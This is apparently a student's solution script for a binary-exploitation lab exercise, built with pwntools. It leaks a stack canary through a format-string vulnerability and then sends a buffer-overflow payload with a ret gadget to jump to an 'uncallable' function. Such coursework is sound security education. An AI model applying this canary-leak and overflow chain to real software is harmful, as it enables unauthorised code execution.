#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise5/exercise5a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Ideas:
- Leverage a format string vulnerability
	- => to leak the canary values (canary enables)
	- fortunately PIE disabled => ELF() 
	==> perform buffer overflow to execute uncallable()

Workflow:
- ELF() and ROP() --> for uncallable() and ret gadget (from gdb output: 0x40101a) 
- From gdb trial and error --> 10 times '%x' specifiers to leak canary from stack
- Receive the leaked values and parse them to find the canary.
- Payload crafting: buffer + canary + padding + ret + uncallable address
'''

# From Ghidra and gdb:
BUFFER_SIZE = 256
PADDING_SIZE = 16
LEAK_SIZE = 10

elf = ELF('handout/exercise5/exercise5a')
rop = ROP(elf)

r = start()

uncallable_address = elf.symbols['uncallable']
ret_gadget = rop.ret[0]

#print(hex(ret_gadget))

r.sendline(b'%x_'*LEAK_SIZE)
leak = r.recvuntil(b'the password')

#print(leak)

canary_values = leak.decode().split('_')[-5]

#print(leak.decode().split('_'))
#print(canary_values[-5])

payload = b'A'*BUFFER_SIZE + p64(int(canary_values,16)) + b'A'*PADDING_SIZE + p64(ret_gadget) + p64(uncallable_address)

r.sendline(payload)
print(r.recvall())
